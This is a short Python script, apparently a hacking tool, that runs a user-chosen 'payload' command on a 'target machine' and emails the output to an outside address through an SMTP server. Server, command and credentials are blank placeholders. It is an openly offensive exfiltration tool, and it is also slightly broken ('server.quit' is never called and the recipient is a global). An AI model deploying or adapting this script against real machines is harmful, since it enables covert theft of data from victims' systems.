# Send email with a command output running on the target machine
# Author Rocken2k
 
import subprocess, smtplib

#Function: create an instance of SMTP server and Initiate a TLS connection
def send_mail(email, password, message):
    server = smtplib.SMTP("", ) # <------------ STPServer and port ex:<"smtp.gmail.com", 587 >
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email_to, message)
    server.quit

command = "" # <------------ Payload/command
result = subprocess.check_output(command, shell=True)
email_to = "" # <------------the reciver email address
send_mail("","",result)# <------------ Your email credential here username/password